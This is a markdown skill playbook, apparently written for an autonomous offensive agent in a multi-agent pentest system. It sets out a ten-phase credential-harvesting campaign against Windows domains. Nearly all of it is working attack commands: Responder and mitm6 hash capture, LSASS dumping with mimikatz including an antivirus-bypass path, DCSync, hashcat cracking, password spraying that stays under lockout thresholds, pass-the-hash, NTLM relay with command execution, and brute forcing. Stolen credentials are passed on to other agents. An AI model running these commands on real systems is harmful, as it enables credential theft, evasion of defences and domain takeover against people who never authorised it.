---
skill: credential-harvesting-deep-aggressive
mitre_attack_id: [T1110, T1003, T1555]
owasp_mapping: [A07, A04]
difficulty: advanced
mode: deep-aggressive
tags: [credential-dumping, password-spraying, hash-capture, ntlm-relay, pass-the-hash, kerberos-attacks, hashcat-mode-selection, wordlist-generation]
---

# Deep Aggressive Mode Playbook: creed-creds-agent

> Purpose: This playbook is the deep-aggressive operational doctrine for credential harvesting. Hash capture, spraying, relay, cracking, and reuse run in parallel. Every credential is validated, classified, and routed downstream. Lockout evasion and relay hygiene are enforced from the first attempt.

## Phase 1 — Environment Setup & Target Preparation

Reference: skills/network-security/service-enumeration.md

1. Receive session access from exploit-agent with target details and privilege level.
2. Enumerate the target environment for credential-relevant context:
   - `crackmapexec smb <target>/24` to map hosts, OS, SMB signing state, and null sessions
   - `kerbrute userenum -d <domain> --dc <DC> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
   - `crackmapexec smb <target> -u '' -p '' --users --groups --pass-pol --shares`
   - `ldapsearch -x -H ldap://<DC> -b "dc=<domain>,dc=<com>" "(objectclass=person)" sAMAccountName`
3. Confirm SMB signing state across hosts: targets with signing disabled are relay candidates:
   - `crackmapexec smb <subnet>/24 | grep "signing:False"`
4. Harvest target-specific wordlist material before spraying:
   - `cewl -d 3 -m 6 -w words.txt https://target.com`
   - `cewl --with-numbers --email --phone -w osint_words.txt https://intranet.target.com`
   - `crunch 8 12 "Company2023!@#" -o mask_words.txt`
5. Start capture listeners in parallel with exploitation:
   - `responder -I eth0 -rdwv` (analyze mode first: `responder -I eth0 -A`)
   - `impacket-ntlmrelayx.py -tf relay_targets.txt -smb2support -socks`

## Phase 2 — Network Hash Capture (LLMNR/NBT-NS/mDNS)

Reference: skills/network-security/protocol-exploitation.md

1. Deploy Responder on the target subnet for LLMNR/NBT-NS/mDNS poisoning:
   - `responder -I eth0 -rdwv -w -r`
   - `-P` to force NTLMv1 downgrade (responder config: Set NTLMv1 = 1)
2. If relaying, disable SMB and HTTP in Responder.conf so the tool never captures its own challenge, then run ntlmrelayx separately.
3. Passive collection: `responder -I eth0 -A` (analyze-only, no poisoning) when stealth is required.
4. Forced authentication via mitm6 (DHCPv6 + WPAD) to coerce NTLMv2 from hosts:
   - `mitm6 -d <domain> -i eth0` combined with ntlmrelayx to LDAP/SMB
5. Collect captured hashes from `/usr/share/responder/logs/Responder-<type>-NTLMv2-SSP.txt`.
6. Classify each capture: NTLMv1 (responder -P) vs NTLMv2; both crackable offline (hashcat -m 5500 / -m 5600).

## Phase 3 — Memory & Registry Credential Extraction

1. On SYSTEM/Admin access, extract LSASS memory:
   - `mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"`
   - If AV blocks mimikatz: `procdump.exe -ma lsass.exe lsass.dmp` then `mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"`
   - `comsvcs.dll` via rundll32: `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full`
2. Registry/SAM extraction:
   - `crackmapexec smb <target> -u <user> -H <hash> --sam --lsa --ntds`
   - `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes :<NTHASH> <domain>/<user>@<target> -just-dc-user <target>`
   - Full NTDS.dit: `secretsdump.py -just-dc <domain>/<admin>@<DC>`
3. Kerberos ticket extraction (PtT):
   - `mimikatz "privilege::debug" "sekurlsa::tickets /export"`
   - `mimikatz "kerberos::list /export"`
4. DPAPI and vault extraction:
   - `mimikatz "dpapi::masterkey" "dpapi::cred" "vault::cred"`
5. LAPS passwords: `crackmapexec ldap <DC> -u <user> -p <pass> --laps`
6. GMSA/MSA credentials: `crackmapexec ldap <DC> -u <user> -p <pass> -M gmsa`

## Phase 4 — DCSync & Offline Hash Dump

1. With DA-equivalent access, DCSync any account:
   - `mimikatz "lsadump::dcsync /domain:<domain> /user:Administrator"`
   - `secretsdump.py -just-dc-ntlm <domain>/<admin>@<DC>`
2. Dump full NTDS.dit for offline cracking:
   - `secretsdump.py -just-dc <domain>/<admin>@<DC> > ntds_hashes.txt`
   - Or copy NTDS.dit + SYSTEM hive and extract locally:
     - `crackmapexec smb <DC> -u <admin> -p <pass> --ntds`
3. Extract hashes in `user:rid:lmhash:nthash:::` format for direct hashcat input.

## Phase 5 — Hash Identification & Cracking

Reference: skills/network-security/service-enumeration.md (credential reuse prerequisites)

1. Identify every hash type before selecting hashcat mode:
   - `hashid '31d6cfe0d16ae931b73c59d7e0c089c0'`
   - `hashcat --identify hash.txt`
2. Hashcat mode selection:
   - NTLM: `hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O -w 3`
   - Net-NTLMv2 (Responder): `hashcat -m 5600 responder_hashes.txt rockyou.txt -r best64.rule`
   - Net-NTLMv1: `hashcat -m 5500 responder_ntlmv1.txt rockyou.txt`
   - Kerberos TGS (kerberoast): `hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule`
   - Kerberos AS-REP (ASREProast): `hashcat -m 18200 asrep_hashes.txt rockyou.txt`
   - bcrypt: `hashcat -m 3200 bcrypt.txt rockyou.txt -O` (CPU-heavy; use wordlist first)
   - PBKDF2: `hashcat -m 7100 pbkdf2.txt rockyou.txt`
3. Attack escalation order:
   - `hashcat -m 1000 h.txt rockyou.txt -r best64.rule`
   - `hashcat -m 1000 h.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`
   - `hashcat -m 1000 h.txt -a 3 '?u?l?l?l?l?l?l?d?d?d?s'`
   - `hashcat -m 1000 h.txt -a 6 rockyou.txt '?d?d?d?s'`
   - `hashcat -m 1000 h.txt -a 7 '?u?l?l?l?l?l?l' rockyou.txt`
   - `hashcat -m 1000 h.txt -a 3 mask_words.txt` (crunch/cewl masks)
4. Target-specific wordlists: combine cewl output + crunch masks into a priority list and run first:
   - `cat cewl_words.txt mask_words.txt | sort -u > target_words.txt`
   - `hashcat -m 1000 h.txt target_words.txt`
5. Slow hashes: john fallback with incremental:
   - `john --format=bcrypt --wordlist=rockyou.txt --rules=all bcrypt.txt`
   - `john --incremental bcrypt.txt`
6. PRINCE mode for low-hash-count high-value targets:
   - `hashcat -m 1000 h.txt /usr/share/hashcat/masks/rockyou-1-60.hcprince -a 9`
7. Track session: `--potfile-path ./creds.pot` and resume with `--restore`.

## Phase 6 — Password Spraying (Lockout-Evasion)

Reference: skills/network-security/protocol-exploitation.md (spray via protocol abuse)

1. Spray one high-probability password per account per window:
   - `crackmapexec smb <subnet>/24 -u users.txt -p 'Spring2026!' --continue-on-success`
   - `crackmapexec winrm <subnet>/24 -u users.txt -p 'Spring2026!' --continue-on-success`
2. Kerberos spraying (does not trigger most lockout policies):
   - `kerbrute passwordspray -d <domain> --dc <DC> users.txt 'Spring2026!'`
3. Enumerate lockout threshold first: single bad password on a sacrificial account, observe event 4740 or error.
4. Keep attempts under 75% of the lockout threshold per account; space attempts by randomized 5-30 minute intervals.
5. Spray sequentially across SMB, LDAP, WinRM, MSSQL to multiply coverage per password.
6. Harvest valid users first to maximize spray yield:
   - `crackmapexec smb <DC> -u '' -p '' --users`
   - `rpcclient -U "" -N <DC> "enumdomusers"`
   - `kerbrute userenum -d <domain> --dc <DC> top-usernames.txt`
7. Default credentials pass: `hydra -L users.txt -p 'admin' smb://<target>`, `hydra -l root -P top100.txt ssh://<target> -t 4`.

## Phase 7 — Pass-the-Hash & Credential Reuse

1. Validate every cracked plaintext and every raw NTHash across services:
   - `crackmapexec smb <subnet>/24 -u <user> -p <pass> --continue-on-success`
   - `crackmapexec smb <subnet>/24 -u <user> -H <NTHASH> --continue-on-success`
   - `crackmapexec winrm <subnet>/24 -u <user> -p <pass>`
   - `crackmapexec ssh <subnet>/24 -u <user> -p <pass> --continue-on-success`
   - `crackmapexec mssql <subnet>/24 -u <user> -p <pass>`
2. Local admin reuse sweep: `crackmapexec smb <subnet>/24 -u Administrator -H <NTHASH> --local-auth --continue-on-success`.
3. Pass-the-hash execution:
   - `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :<NTHASH> <domain>/<user>@<target>`
   - `python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :<NTHASH> <domain>/<user>@<target>`
   - `evil-winrm -i <target> -u <user> -H <NTHASH>`
   - `crackmapexec smb <target> -u <user> -H <NTHASH> -x 'whoami' --exec-method wmiexec`
4. Pass-the-ticket:
   - `mimikatz "kerberos::ptt <ticket.kirbi>"` then access SPNs with `crackmapexec` / `psexec`.
   - Rubeus equivalent: `Rubeus.exe ptt /ticket:base64.ticket`
5. Kerberoast for service account tickets:
   - `impacket-GetUserSPNs.py <domain>/<user>:<pass> -request -dc-ip <DC> -outputfile tgs_hashes.txt`
6. AS-REP roast for pre-auth-disabled accounts:
   - `impacket-GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <DC> -outputfile asrep_hashes.txt`

## Phase 8 — NTLM Relay Exploitation

Reference: skills/network-security/protocol-exploitation.md (SMB relay chain)

1. Identify signing-disabled hosts: `crackmapexec smb <subnet>/24 | grep "signing:False"`.
2. Run Responder without SMB/HTTP (edit Responder.conf), then relay:
   - `impacket-ntlmrelayx.py -tf relay_targets.txt -smb2support -c 'whoami'`
   - SOCKS relay for tool traffic: `impacket-ntlmrelayx.py -tf relay_targets.txt -smb2support -socks`
3. Interactive SMB relay shell: `impacket-ntlmrelayx.py -t smb://<target> -smb2support -i`.
4. HTTP relay to web app NTLM auth; LDAP relay for ESC8:
   - `impacket-ntlmrelayx.py -t ldap://<DC> --escalate-user <user> -smb2support`
5. Relay to MSSQL: `impacket-ntlmrelayx.py -t mssql://<target> -smb2support -c 'xp_cmdshell whoami'`.
6. Coerce auth with mitm6 (WPAD proxy) for hosts that never send NTLMv2:
   - `mitm6 -d <domain> -i eth0` + ntlmrelayx to SMB/LDAP.
7. Verify relayed code execution and feed the resulting credentials/hashes into the pipeline.

## Phase 9 — HTTP/SMB/SSH/RDP Auth Attacks

Reference: skills/network-security/protocol-exploitation.md (weak credential paths)

1. HTTP form auth: `hydra -L users.txt -P pass.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4`.
2. SMB brute (authorized, low rate): `hydra -L users.txt -P pass.txt smb://<target> -t 4`.
3. RDP brute: `ncrack -U users.txt -P pass.txt rdp://<target>` with service tuning.
4. SSH brute: `hydra -L users.txt -P pass.txt ssh://<target> -t 4`.
5. WinRM brute: `crackmapexec winrm <subnet>/24 -u users.txt -p pass.txt`.
6. FTP/SNMP defaults: `hydra ftp://<target>`, `onesixtyone -c community.txt <target>`.
7. Medusa multi-threaded: `medusa -h <target> -U users.txt -P pass.txt -M ssh -t 4`.
8. Always respect lockout thresholds and document every attempt count.

## Phase 10 — Validation & Credential Routing

1. Validate every credential by real authentication against the target service:
   - `crackmapexec smb <target> -u <user> -p <pass>` (SMB + shares)
   - `crackmapexec ldap <DC> -u <user> -p <pass>` (domain reach)
   - `curl -u user:pass https://<target>/` (HTTP basic)
2. Classify by type, source, scope, and priority (Domain Admin > Local Admin > User).
3. Send to vault-agent for AES-256-GCM encrypted storage; route credentials to pivot-agent and exploit-agent.
4. Record verification matrix: which services accepted, which rejected, lockout events avoided.

## Verification

1. Every credential authenticated against at least one live service (never assumed valid).
2. Hash capture correlated to the originating host and trigger (LLMNR, WPAD, relay coercion).
3. Spray attempts counted and compared against the lockout threshold; zero lockouts caused.
4. Cracking sessions restored and completed; potfile backed up for audit.
5. Relay chains verified via executed command output or SOCKS connectivity.
6. Credentials handled via vault-agent only; no plaintext written to logs or playbook output.

## Skill Library References
- skills/network-security/service-enumeration.md
- skills/network-security/protocol-exploitation.md
- skills/penetration-testing/command-injection.md
- skills/threat-intel/skill-playbook.md
